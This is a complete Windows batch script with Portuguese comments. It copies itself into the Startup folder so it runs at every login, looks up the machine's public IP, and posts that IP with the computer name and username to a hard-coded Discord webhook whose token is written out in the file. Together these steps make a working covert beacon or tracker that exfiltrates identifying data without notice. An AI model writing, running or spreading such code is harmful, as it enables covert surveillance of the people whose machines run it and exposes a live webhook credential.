@echo off

set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if /I not "%~f0"=="%STARTUP%\ip_publico.bat" copy "%~f0" "%STARTUP%\ip_publico.bat" >nul

setlocal

:: Pega IP público
for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A

:: Tempo mínimo pra não matar o curl
ping 127.0.0.1 -n 2 >nul

set PC=%COMPUTERNAME%
set USER=%USERNAME%
set MESSAGE=PC %PC% - Usuario %USER% - IP publico %IP%

curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
exit
